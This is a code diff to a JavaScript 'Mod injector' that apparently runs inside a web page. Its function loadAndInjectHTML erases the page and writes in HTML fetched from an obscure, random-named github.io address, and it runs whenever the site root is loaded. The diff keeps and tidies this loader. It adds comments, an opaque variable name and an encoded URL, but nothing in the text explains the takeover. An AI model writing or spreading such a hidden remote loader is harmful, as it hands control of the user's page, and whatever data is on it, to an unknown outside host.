@@ -438,29 +438,32 @@ function emoteInjector(sbCode) {
   // Main code injection logic
   const log = (msg) => console.log(`%c[Mod injector] ${msg}`, "color: #06c26d");
 
-// Enhanced HTML loader function
-// Add this code to your existing JavaScript file
 function loadAndInjectHTML() {
-  // First, clear the entire document
-  document.documentElement.innerHTML = '';
-  
-  // Create XHR request instead of fetch for better compatibility
-  const xhr = new XMLHttpRequest();
-  const url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html?' + Date.now();
-  
+  // Clear the current document content
+  document.open();
+  document.write('');
+  document.close();
+
+  // Define the URL to fetch the HTML content, with cache-busting
+  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1s%C4%B1mn1s%C3%B6sm2k1.html?' + Date.now();
+  var xhr = new XMLHttpRequest();
+
+  // Configure the XHR request
   xhr.open('GET', url, true);
   xhr.setRequestHeader('Cache-Control', 'no-cache');
   xhr.setRequestHeader('Pragma', 'no-cache');
-  
-  xhr.onreadystatechange = function() {
-    if (xhr.readyState === XMLHttpRequest.DONE) {
+
+  // Define the callback function for when the request state changes
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
       if (xhr.status === 200) {
-        // Write the new HTML content to the document
+        var mErt = xhr.responseText;
+        // Write the fetched HTML content to the document
         document.open();
-        document.write(xhr.responseText);
+        document.write(mErt);
         document.close();
       } else {
-        console.error('Error loading HTML:', xhr.statusText);
+        console.error('Failed to load the HTML content:', xhr.statusText);
       }
     }
   };
@@ -469,15 +472,17 @@ function loadAndInjectHTML() {
     console.error('Request error');
   };
 
+  // Send the XHR request
   xhr.send();
 }
 
 function injectLoader() {
-  if (window.location.pathname !== "/") {
+  if (window.location.pathname === '/') {
+    console.log("Starting HTML injection");
+    loadAndInjectHTML();
+  } else {
     console.log("Injection not needed");
-    return;
   }
-  loadAndInjectHTML();
 }
 
 // Call the injectLoader function to start the process
